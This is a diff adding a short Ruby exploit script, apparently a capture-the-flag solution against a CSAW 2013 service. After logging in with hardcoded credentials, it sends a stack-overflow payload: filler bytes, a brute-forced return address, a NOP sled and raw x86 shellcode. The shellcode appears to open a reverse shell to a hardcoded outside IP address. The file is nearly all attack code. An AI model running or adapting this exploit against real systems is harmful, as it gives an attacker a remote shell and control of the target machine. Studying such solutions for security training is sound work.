@@ -1,0 +1,29 @@
+#encoding: BINARY
+require 'socket'
+
+ret = 0xbfe29e90
+counter = 0
+
+loop do
+  s = TCPSocket.new('0.0.0.0', 34266)
+  t = Thread.new do |t|
+    loop do
+      s.recv(0x1000)
+    end
+  end
+
+  sc = "\x68\x8f\xf8\x02\x0D\x5e\x66\x68\xd9\x03\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\xce"
+
+  s.write("csaw2013")
+  s.write("S1mplePWD")
+  s.write(0xffff)
+
+  s.write("\x80"*0x425 + [ret].pack("<I") + "\x90" * 500 + sc)
+  sleep(0.5)
+  s.close()
+  t.exit
+
+  ret -= 0x1000
+  counter += 1
+  puts "Current : #{ret.to_s(16)}" if counter % 10 == 0
+end
